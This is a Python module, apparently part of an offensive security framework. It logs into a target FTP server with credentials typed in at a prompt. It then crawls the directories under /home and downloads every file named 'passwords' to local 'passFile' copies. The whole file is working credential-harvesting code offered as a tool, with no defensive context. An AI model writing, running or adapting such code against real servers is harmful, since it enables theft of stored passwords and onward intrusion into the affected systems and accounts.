import ftplib
from jframework.modules.model import Module
import jframework.extras.writeformat as wf

class Ftpdownload(Module):

    def __init__(self):
        super(Ftpdownload,self).__init__()
        self.name_search = "passwords"
        self.dir_root = "/home"

    def help(self):
        super(Ftpdownload, self).help()
        print("name_file <name> -> set the name's file to search")
        print("dir <name_directory> -> set de first directory to search. e.g: /home")

    def conf(self):
        super(Ftpdownload, self).conf()
        wf.printf("name_file", self.name_search, "Name's file to search")
        wf.printf("dir", self.dir_root, "Directory to search")

    def get_options(self):
        options = super(Ftpdownload,self).get_options()
        options.extend(["name_file", "dir"])
        return options

    def name_file(self,name):
        self.name_search = name

    def dir(self, directory):
        self.dir_root = directory

    def run(self):
        out = False
        while True and not out:
            user = input("User: ")
            if (user == ""):
                break
            password = input("Password: ")
            ftp = ftplib.FTP()
            try:
                ftp.connect(self.host, timeout=7)
                ftp.login(user, password)
                print("SUCCESS: " + str(user) + ":" + str(password))
                out = True
                files_found = 0
                dirs = []
                visit = []
                try:
                    ftp.cwd(self.dir_root)
                    dirs.append(ftp.pwd())
                except:
                    print(self.dir_root,"is not availaible")
                    break
                while len(dirs) > 0:
                    dir = dirs.pop()
                    visit.append(dir)
                    try:
                        ftp.cwd(dir)
                    except:
                        continue

                    aux = self.fill(ftp, ftp.pwd(), visit)
                    dirs.extend(aux)

                    try:
                        ftp.retrbinary('RETR %s' %self.name_search, open("passFile" + str(files_found + 1), 'wb').write)
                        print(chr(27) + "[1;34m[+] Download file from " + chr(27) + "[0m" + dir)
                        files_found += 1
                    except Exception as e:
                        print(chr(27) + "[1;31m[-] Not found in " + chr(27) + "[0m" + dir)

                ftp.quit()
                print("Files found & download:", files_found)
                out = True

                ftp.close()
                break
            except Exception as e:
                if ("Authentication failed." == str(e)):
                    print(e)
                print(e)
            try:
                ftp.close()
            except:
                pass

    def fill(self, ftp, dir, visit):
        list_aux = ftp.nlst()
        new_list = []
        for el in list_aux:
            if (str(dir) != "/"):
                d = str(dir) + "/" + str(el)
            else:
                d = str(dir) + str(el)
            if (not d in visit):
                new_list.append(d)
        return new_list


